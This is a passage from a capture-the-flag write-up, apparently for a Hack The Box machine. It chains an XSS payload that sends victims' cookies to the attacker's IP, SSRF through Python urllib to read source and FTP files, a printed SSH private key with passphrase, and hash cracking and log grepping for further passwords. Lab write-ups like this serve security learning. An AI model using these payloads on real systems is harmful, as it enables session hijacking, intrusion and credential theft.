<li><strong>auth.comprezzor.htb</strong></li>
<li><strong>dashboard.comprezzor.htb</strong> (requires login as an authorized user)</li>
</ul>
<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
<p>To gain unauthorized access, I decided to attempt stealing cookies using a cross-site scripting (XSS) vulnerability. I used the bug report form on <strong>report.comprezzor.htb</strong> for this purpose. Here is the payload I used:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="kd">var</span> <span class="nx">i</span><span class="o">=</span><span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">i</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s2">&#34;http://10.10.14.102:80/?cookie=&#34;</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>This payload successfully captured the cookie by sending the cookie data to my server at <strong><code>http://10.10.14.102</code></strong>. With this session cookie, I could potentially access restricted areas like <strong>dashboard.comprezzor.htb</strong>, demonstrating a significant security flaw that could be exploited for further penetration testing.</p>
<p>After countless attempts and troubleshooting, I finally managed to capture the session cookie. This involved restarting the processes and refining my methods multiple times, but persistence paid off.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">10.129.54.146 - - [28/Apr/2024 11:51:15] &#34;GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&#34; 404 -
</span></span><span class="line"><span class="cl">10.129.54.146 - - [28/Apr/2024 11:51:15] code 404, message File not found
</span></span><span class="line"><span class="cl">10.129.54.146 - - [28/Apr/2024 11:51:15] &#34;GET /user_data=eyJ1c2VyX2lkIjogMiwgInVzZXJuYW1lIjogImFkYW0iLCAicm9sZSI6ICJ3ZWJkZXYifXw1OGY2ZjcyNTMzOWNlM2Y2OWQ4NTUyYTEwNjk2ZGRlYmI2OGIyYjU3ZDJlNTIzYzA4YmRlODY4ZDNhNzU2ZGI4 HTTP/1.1&#34; 404 -
</span></span></code></pre></td></tr></table>
</div>
</div><p>
    
    <input type="checkbox" id="zoomCheck-72c69" hidden>
    <label for="zoomCheck-72c69">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%201.png" alt="Untitled" 
             />
    </label></p>
<p>Using the stolen cookie, I accessed the &ldquo;Create PDF Report&rdquo; site. From here, I executed a Server-Side Request Forgery (SSRF) attack by manipulating the report URL to send a request to my own HTTP server. This allowed me to intercept and analyze the server&rsquo;s response.</p>
<p>Through this SSRF attack, I received a new cookie:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifXwzNDgyMjMzM2Q0NDRzZTBlNDAyMmY2Y2M2NzlhYzlkMjZkMWQxZDY4MmM1OWM2MWNmYmVhMjlkNzc2ZDU4OWQ5
</span></span></code></pre></td></tr></table>
</div>
</div><p>
    
    <input type="checkbox" id="zoomCheck-2b2df" hidden>
    <label for="zoomCheck-2b2df">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%202.png" alt="Untitled" 
             />
    </label></p>
<p>
    
    <input type="checkbox" id="zoomCheck-23e4a" hidden>
    <label for="zoomCheck-23e4a">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%203.png" alt="Untitled" 
             />
    </label></p>
<p>By leveraging the SSRF vulnerability, I noticed that the reply contained the following user agent:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-makefile" data-lang="makefile"><span class="line"><span class="cl"><span class="nf">User-Agent</span><span class="o">:</span> <span class="n">Python</span>-<span class="n">urllib</span>/3.11
</span></span></code></pre></td></tr></table>
</div>
</div><p>This indicated that the application might be using a Python script to handle requests. Recognizing the potential for exploitation, I researched and found relevant exploits, including one discussed in <a href="https://github.com/python/cpython/issues/102153">this GitHub issue</a>.</p>
<p>Utilizing this CVE, I managed to retrieve the source code of the application via the SSRF attack. Access to the source code provided valuable insights into the internal workings of the application, including potential vulnerabilities and misconfigurations.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-d3f79" hidden>
    <label for="zoomCheck-d3f79">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%204.png" alt="Untitled" 
             />
    </label></p>
<p>Using the SSRF vulnerability, I targeted the specific path where the application code was likely stored. By sending a request to fetch <strong><code>python3/app/code/app.py</code></strong>, I successfully retrieved the source code of the Flask application.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-c9029" hidden>
    <label for="zoomCheck-c9029">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%205.png" alt="Untitled" 
             />
    </label></p>
<p>
    
    <input type="checkbox" id="zoomCheck-925b7" hidden>
    <label for="zoomCheck-925b7">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%206.png" alt="Untitled" 
             />
    </label></p>
<p>
    
    <input type="checkbox" id="zoomCheck-5c428" hidden>
    <label for="zoomCheck-5c428">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%207.png" alt="Untitled" 
             />
    </label></p>
<p>By analyzing the source code retrieved from <strong><code>python3/app/code/app.py</code></strong>, I developed a blueprint to help navigate and identify interesting components within the application. This blueprint focused on key areas such as routes, functions, and any hardcoded sensitive information.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">project_folder/
</span></span><span class="line"><span class="cl">│
</span></span><span class="line"><span class="cl">├── app.py
</span></span><span class="line"><span class="cl">│
</span></span><span class="line"><span class="cl">├── blueprints/
</span></span><span class="line"><span class="cl">│   ├── __init__.py
</span></span><span class="line"><span class="cl">│   │
</span></span><span class="line"><span class="cl">│   ├── index/
</span></span><span class="line"><span class="cl">│   │   ├── __init__.py
</span></span><span class="line"><span class="cl">│   │   └── index.py
</span></span><span class="line"><span class="cl">│   │
</span></span><span class="line"><span class="cl">│   ├── report/
</span></span><span class="line"><span class="cl">│   │   ├── __init__.py
</span></span><span class="line"><span class="cl">│   │   └── report.py
</span></span><span class="line"><span class="cl">│   │
</span></span><span class="line"><span class="cl">│   ├── auth/
</span></span><span class="line"><span class="cl">│   │   ├── __init__.py
</span></span><span class="line"><span class="cl">│   │   └── auth.py
</span></span><span class="line"><span class="cl">│   │
</span></span><span class="line"><span class="cl">│   └── dashboard/
</span></span><span class="line"><span class="cl">│       ├── __init__.py
</span></span><span class="line"><span class="cl">│       └── dashboard.py
</span></span><span class="line"><span class="cl">│
</span></span><span class="line"><span class="cl">└── static/
</span></span><span class="line"><span class="cl">    ├── css/
</span></span><span class="line"><span class="cl">    ├── js/
</span></span><span class="line"><span class="cl">    └── ...
</span></span></code></pre></td></tr></table>
</div>
</div><p>With the useful code extracted from <strong><code>dashboard.py</code></strong> using the SSRF vulnerability, we can analyze it to identify critical functionalities, potential vulnerabilities, and further actions for exploitation.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">try:
</span></span><span class="line"><span class="cl">    ftp = FTP(&#39;ftp.local&#39;)
</span></span><span class="line"><span class="cl">    ftp.login(user=&#39;ftp_admin&#39;, passwd=&#39;u3jai8y71s2&#39;)
</span></span><span class="line"><span class="cl">    ftp.cwd(&#39;/&#39;)
</span></span><span class="line"><span class="cl">    with open(backup_filename, &#39;rb&#39;) as file:
</span></span><span class="line"><span class="cl">        ftp.storbinary(f&#39;STOR {backup_filename}&#39;, file)
</span></span><span class="line"><span class="cl">    ftp.quit()
</span></span><span class="line"><span class="cl">    os.remove(backup_filename)
</span></span><span class="line"><span class="cl">    flash(&#39;Backup and upload completed successfully!&#39;, &#39;success&#39;)
</span></span><span class="line"><span class="cl">except Exception as e:
</span></span><span class="line"><span class="cl">    flash(f&#39;Error: {str(e)}&#39;, &#39;error&#39;)
</span></span><span class="line"><span class="cl">    return redirect(url_for(&#39;dashboard.dashboard&#39;))
</span></span></code></pre></td></tr></table>
</div>
</div><p>In the code above, I noticed FTP credentials. I&rsquo;ll utilize the SSRF method to connect to this FTP.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ftp://ftp_admin:u3jai8y71s2@ftp.local/
</span></span></code></pre></td></tr></table>
</div>
</div><p>
    
    <input type="checkbox" id="zoomCheck-e548e" hidden>
    <label for="zoomCheck-e548e">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%208.png" alt="Untitled" 
             />
    </label></p>
<p>I used the FTP credentials as an SSRF payload from the previous step. We observed there is a private key. I attempt to view it.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-61ca7" hidden>
    <label for="zoomCheck-61ca7">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%209.png" alt="Untitled" 
             />
    </label></p>
<p>With this payload, I will attempt to view the private key located at the following FTP URL: <strong><code>ftp://ftp_admin:u3jai8y71s2@ftp.local/private-8297.key</code></strong>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDyIVwjHg
</span></span><span class="line"><span class="cl">cDQsuL69cF7BJpAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQDfUe6nu6ud
</span></span><span class="line"><span class="cl">KETqHA3v4sOjhIA4sxSwJOpWJsS//l6KBOcHRD6qJiFZeyQ5NkHiEKPIEfsHuFMzykx8lA
</span></span><span class="line"><span class="cl">KK79WWvR0BV6ZwHSQnRQByD9eAj60Z/CZNcq19PHr6uaTRjHqQ/zbs7pzWTs+mdCwKLOU7
</span></span><span class="line"><span class="cl">x+X0XGGmtrPH4/YODxuOwP9S7luu0XmG0m7sh8I1ETISobycDN/2qa1E/w0VBNuBltR1BR
</span></span><span class="line"><span class="cl">BdDiGObtiZ1sG+cMsCSGwCB0sYO/3aa5Us10N2v3999T7u7YTwJuf9Vq5Yxt8VqDT/t+JX
</span></span><span class="line"><span class="cl">U0LuE5xPpzedBJ5BNGNwAPqkEBmjNnQsYlBleco6FN4La7Irn74fb/7OFGR/iHuLc3UFQk
</span></span><span class="line"><span class="cl">TlK7LNXegrKxxb1fLp2g4B1yPr2eVDX/OzbqAE789NAv1Ag7O5H1IHTH2BTPTF3Fsm7pk+
</span></span><span class="line"><span class="cl">efwRuTusue6fZteAipv4rZAPKETMLeBPbUGoxPNvRy6VLfTLV+CzYGJTdrnNHWYQ7+sqbc
</span></span><span class="line"><span class="cl">JFGDBQ+X3QelEAAAWQ+YGB02Ep/88YxudrpfK8MjnpV50/Ew4KtvEjqe4oNL4zLr4qpRec
</span></span><span class="line"><span class="cl">80EVZXE2y8k7+2Kqe9+i65RDTpTv+D88M4p/x0wOSVoquD3NNKDSDCmuo0+EU+5WrZcLGT
</span></span><span class="line"><span class="cl">ybB8rzzM+RZTm2/XqXvrPPKqtZ9jGIVWhzOirVmbr7lU9reyyotru1RrFDrKSZB4Rju/6V
</span></span><span class="line"><span class="cl">YMLzlQ0hG+558YqQ/VU1wrcViqMCAHoKo+kxYBhvA7Pq1XDtU1vLJRhQikg249Iu4NnPtA
</span></span><span class="line"><span class="cl">bS5NY4W5E0myaT6sj1Nb7GMlU9aId+PQLxwfPzHvmZArlZBl2EdwOrH4K6Acl/WX2Gchia
</span></span><span class="line"><span class="cl">R9Rb3vhhJ9fAP10cmKCGNRXUHgAw3LS/xXbskoaamN/Vj9CHqF1ciEswr0STURBgN4OUO7
</span></span><span class="line"><span class="cl">cEH6cOmv7/blKgJUM/9/lzQ0VSCoBiFkje9BEQ5UFgZod+Lw5UVW5JrkHrO4NHZmJR7epT
</span></span><span class="line"><span class="cl">9e+7RTOJW1rKq6xf4WmTbEMV95TKAu1BIfSPJgLAO25+RF4fGJj+A3fnIB0aDmFmT4qiiz
</span></span><span class="line"><span class="cl">YyJUQumFsZDRxaFCWSsGaTIdZSPzXm1lB0fu3fI1gaJ+73Aat9Z4+BrwxOrQeoSjj6nAJa
</span></span><span class="line"><span class="cl">lPmLlsKmOE+50l+kB2OBuqssg0kQHgPmiI+TMBAW71WU9ce5Qpg7udDVPrbkFPiEn7nBxO
</span></span><span class="line"><span class="cl">JJEKO4U29k93NK1FJNDJ8VI3qqqDy6GMziNapOlNTsWqRf5mCSWpbJu70LE32Ng5IqFGCu
</span></span><span class="line"><span class="cl">r4y/3AuPTgzCQUt78p0NbaHTB8eyOpRwoGvKUQ10XWaFO5IVWlZ3O5Q1JB1vPkxod6YOAk
</span></span><span class="line"><span class="cl">wsOvp4pZK/FPi165tghhogsjbKMrkTS1+RVLhhDIraNnpay2VLMOq8U4pcVYbg0Mm0+Qeh
</span></span><span class="line"><span class="cl">FYsktA4nHEX5EmURXO2WZgQThZrvfsEK5EIPKFMM7BSiprnoapMMFzKAwAh1D8rJlDsgG/
</span></span><span class="line"><span class="cl">Lnw6FPnlUHoSZU4yi8oIras0zYHOQjiPToRMBQQPLcyBUpZwUv/aW8I0BuQv2bbfq5X6QW
</span></span><span class="line"><span class="cl">1VjanxEJQau8dOczeWfG55R9TrF+ZU3G27UZVt4mZtbwoQipK71hmKDraWEyqp+cLmvIRu
</span></span><span class="line"><span class="cl">eIIIcWPliMi9t+c3mI897sv45XWUkBfv6kNmfs1l9BH/GRrD+JYlNFzpW1PpdbnzjNHHZ3
</span></span><span class="line"><span class="cl">NL4dUe3Dt5rGyQF8xpBm3m8H/0bt4AslcUL9RsyXvBK26BIdkqoZHKNyV9xlnIktlVELaZ
</span></span><span class="line"><span class="cl">XTrhQOEGC4wqxRSz8BUZOb1/5Uw/GI/cYabJdsvb/QKxGbm5pBM7YRAgmljYExjDavczU4
</span></span><span class="line"><span class="cl">AEuCbdj+D8zqvuXgIFlAdgen8ppBob0/CBPqE5pTsuAOe3SdEqEvglTrb+rlgWC6wPSvaA
</span></span><span class="line"><span class="cl">rRgthH/1jct9AgmgDd2NntTwi9iXPDqtdx7miMslOIxKJidiR5wg5n4Dl6l5cL+ZN7dT/N
</span></span><span class="line"><span class="cl">KdMz9orpA/UF+sBLVMyfbxoPF3Mxz1SG62lVvH45d7qUxjJe5SaVoWlICsDjogfHfZY40P
</span></span><span class="line"><span class="cl">bicrjPySOBdP2oa4Tg8emN1gwhXbxh1FtxCcahOrmQ5YfmJLiAFEoHqt08o00nu8ZfuXuI
</span></span><span class="line"><span class="cl">9liglfvSvuOGwwDcsv5aVk+DLWWUgWkjGZcwKdd9qBbOOCOKSOIgyZALdLb5kA2yJQ1aZl
</span></span><span class="line"><span class="cl">nEKhrdeHTe4Q+HZXuBSCbXOqpOt9KZwZuj2CB27yGnVBAP+DOYVAbbM5LZWvXP+7vb7+BW
</span></span><span class="line"><span class="cl">ci+lAtzdlOEAI6unVp8DiIdOeprpLnTBDHCe3+k3BD6tyOR0PsxIqL9C4om4G16cOaw9Lu
</span></span><span class="line"><span class="cl">nCzj61Uyn4PfHjPlCfb0VfzrM+hkXus+m0Oq4DccwahrnEdt5qydghYpWiMgfELtQ2Z3W6
</span></span><span class="line"><span class="cl">XxwXArPr6+HQe9hZSjI2hjYC2OU=
</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></td></tr></table>
</div>
</div><p>There is also a passphrase &ldquo;<strong><code>Y27SH19HDIWD</code></strong>&rdquo; on the FTP server, which we can retrieve using the following payload:</p>
<p><strong><code>report_url=++++ftp://ftp_admin:u3jai8y71s2@ftp.local/welcome_note.txt</code></strong></p>
<p>Now I will execute <strong><code>ssh-add</code></strong> to extract the username from the <strong><code>id_rsa</code></strong> file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/s5]
</span></span><span class="line"><span class="cl">└─$ ssh-add id_rsa
</span></span><span class="line"><span class="cl">Enter passphrase for id_rsa: 
</span></span><span class="line"><span class="cl">Identity added: id_rsa (dev_acc@local)
</span></span></code></pre></td></tr></table>
</div>
</div><p>It indicates that the user is <strong><code>dev_acc</code></strong>. Now, I will SSH to the user using the command: <strong><code>ssh dev_acc@10.129.54.146 -i id_rsa</code></strong>.</p>
<p>
    
    <input type="checkbox" id="zoomCheck-3d4df" hidden>
    <label for="zoomCheck-3d4df">
        <img class="zoomCheck" loading="lazy" decoding="async" 
            src="Untitled%2010.png" alt="Untitled" 
             />
    </label></p>
<p>We successfully obtained the user flag! 🚩</p>
<h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
<p>Now, I&rsquo;ll run LinPEAS by fetching it from my host system using a HTTP server created with Python.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">╔══════════╣ Users with console
</span></span><span class="line"><span class="cl">adam:x:1002:1002:,,,:/home/adam:/bin/bash                                                                                                                                                                         
</span></span><span class="line"><span class="cl">dev_acc:x:1001:1001:,,,:/home/dev_acc:/bin/bash
</span></span><span class="line"><span class="cl">lopez:x:1003:1003:,,,:/home/lopez:/bin/bash
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span></code></pre></td></tr></table>
</div>
</div><p>After LinPEAS finished running, I made note of the users in case we might need them later.</p>
<p>Additionally, I found a users.db file in the blueprints directory. I will view its contents using <strong><code>cat</code></strong> to see if we can gather any information.</p>
<p>The users.db file contains a hash for the user &ldquo;adam&rdquo;. We can attempt to crack it using hashcat, John the Ripper, or any other preferred tool.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">����P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�3�EtableusersusersCREATE TABLE users (
</span></span><span class="line"><span class="cl">    id INTEGER PRIMARY KEY AUTOINCREMENT,
</span></span><span class="line"><span class="cl">    username TEXT NOT NULL UNIQUE,
</span></span><span class="line"><span class="cl">    password TEXT NOT NULL,
</span></span><span class="line"><span class="cl">    role TEXT DEFAULT &#39;user&#39;
</span></span><span class="line"><span class="cl">,�,##w��h�=adamsha256$Z7bcBO9P43gvdQWp$a67ea5f8722e69ee99258f208dc56a1d5d631f287106003595087cf42189fc43webdevh�=adminsha256$nypGJ02XBnkIQK71$f0e11dc8ad21242b550cc8a3c27baaf1022b6522afaadbfa92bd612513e9b606admin
</span></span><span class="line"><span class="cl">������
</span></span></code></pre></td></tr></table>
</div>
</div><p>After cracking the hash for user &ldquo;adam&rdquo; using hashcat with the command:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat.exe -m <span class="m">30120</span> myhash.txt rockyou.txt
</span></span></code></pre></td></tr></table>
</div>
</div><p>The credentials for user &ldquo;adam&rdquo; are:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">username: adam
</span></span><span class="line"><span class="cl">password: adam gray
</span></span></code></pre></td></tr></table>
</div>
</div><p>I conducted further enumeration and discovered valid credentials for another user.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dev_acc@intuition:/$ zgrep -i lopez /var/log/suricata/*.gz
</span></span><span class="line"><span class="cl">/var/log/suricata/eve.json.7.gz:<span class="o">{</span><span class="s2">&#34;timestamp&#34;</span>:<span class="s2">&#34;2023-09-28T17:43:36.099184+0000&#34;</span>,<span class="s2">&#34;flow_id&#34;</span>:1988487100549589,<span class="s2">&#34;in_iface&#34;</span>:<span class="s2">&#34;ens33&#34;</span>,<span class="s2">&#34;event_type&#34;</span>:<span class="s2">&#34;ftp&#34;</span>,<span class="s2">&#34;src_ip&#34;</span>:<span class="s2">&#34;192.168.227.229&#34;</span>,<span class="s2">&#34;src_port&#34;</span>:37522,<span class="s2">&#34;dest_ip&#34;</span>:<span class="s2">&#34;192.168.227.13&#34;</span>,<span class="s2">&#34;dest_port&#34;</span>:21,<span class="s2">&#34;proto&#34;</span>:<span class="s2">&#34;TCP&#34;</span>,<span class="s2">&#34;tx_id&#34;</span>:1,<span class="s2">&#34;community_id&#34;</span>:<span class="s2">&#34;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&#34;</span>,<span class="s2">&#34;ftp&#34;</span>:<span class="o">{</span><span class="s2">&#34;command&#34;</span>:<span class="s2">&#34;USER&#34;</span>,<span class="s2">&#34;command_data&#34;</span>:<span class="s2">&#34;lopez&#34;</span>,<span class="s2">&#34;completion_code&#34;</span>:<span class="o">[</span><span class="s2">&#34;331&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply&#34;</span>:<span class="o">[</span><span class="s2">&#34;Username ok, send password.&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply_received&#34;</span>:<span class="s2">&#34;yes&#34;</span><span class="o">}}</span>
</span></span><span class="line"><span class="cl">/var/log/suricata/eve.json.7.gz:<span class="o">{</span><span class="s2">&#34;timestamp&#34;</span>:<span class="s2">&#34;2023-09-28T17:43:52.999165+0000&#34;</span>,<span class="s2">&#34;flow_id&#34;</span>:1988487100549589,<span class="s2">&#34;in_iface&#34;</span>:<span class="s2">&#34;ens33&#34;</span>,<span class="s2">&#34;event_type&#34;</span>:<span class="s2">&#34;ftp&#34;</span>,<span class="s2">&#34;src_ip&#34;</span>:<span class="s2">&#34;192.168.227.229&#34;</span>,<span class="s2">&#34;src_port&#34;</span>:37522,<span class="s2">&#34;dest_ip&#34;</span>:<span class="s2">&#34;192.168.227.13&#34;</span>,<span class="s2">&#34;dest_port&#34;</span>:21,<span class="s2">&#34;proto&#34;</span>:<span class="s2">&#34;TCP&#34;</span>,<span class="s2">&#34;tx_id&#34;</span>:2,<span class="s2">&#34;community_id&#34;</span>:<span class="s2">&#34;1:SLaZvboBWDjwD/SXu/SOOcdHzV8=&#34;</span>,<span class="s2">&#34;ftp&#34;</span>:<span class="o">{</span><span class="s2">&#34;command&#34;</span>:<span class="s2">&#34;PASS&#34;</span>,<span class="s2">&#34;command_data&#34;</span>:<span class="s2">&#34;Lopezzz1992%123&#34;</span>,<span class="s2">&#34;completion_code&#34;</span>:<span class="o">[</span><span class="s2">&#34;530&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply&#34;</span>:<span class="o">[</span><span class="s2">&#34;Authentication failed.&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply_received&#34;</span>:<span class="s2">&#34;yes&#34;</span><span class="o">}}</span>
</span></span><span class="line"><span class="cl">/var/log/suricata/eve.json.7.gz:<span class="o">{</span><span class="s2">&#34;timestamp&#34;</span>:<span class="s2">&#34;2023-09-28T17:44:32.133372+0000&#34;</span>,<span class="s2">&#34;flow_id&#34;</span>:1218304978677234,<span class="s2">&#34;in_iface&#34;</span>:<span class="s2">&#34;ens33&#34;</span>,<span class="s2">&#34;event_type&#34;</span>:<span class="s2">&#34;ftp&#34;</span>,<span class="s2">&#34;src_ip&#34;</span>:<span class="s2">&#34;192.168.227.229&#34;</span>,<span class="s2">&#34;src_port&#34;</span>:45760,<span class="s2">&#34;dest_ip&#34;</span>:<span class="s2">&#34;192.168.227.13&#34;</span>,<span class="s2">&#34;dest_port&#34;</span>:21,<span class="s2">&#34;proto&#34;</span>:<span class="s2">&#34;TCP&#34;</span>,<span class="s2">&#34;tx_id&#34;</span>:1,<span class="s2">&#34;community_id&#34;</span>:<span class="s2">&#34;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&#34;</span>,<span class="s2">&#34;ftp&#34;</span>:<span class="o">{</span><span class="s2">&#34;command&#34;</span>:<span class="s2">&#34;USER&#34;</span>,<span class="s2">&#34;command_data&#34;</span>:<span class="s2">&#34;lopez&#34;</span>,<span class="s2">&#34;completion_code&#34;</span>:<span class="o">[</span><span class="s2">&#34;331&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply&#34;</span>:<span class="o">[</span><span class="s2">&#34;Username ok, send password.&#34;</span><span class="o">]</span>,<span class="s2">&#34;reply_received&#34;</span>:<span class="s2">&#34;yes&#34;</span><span class="o">}}</span>
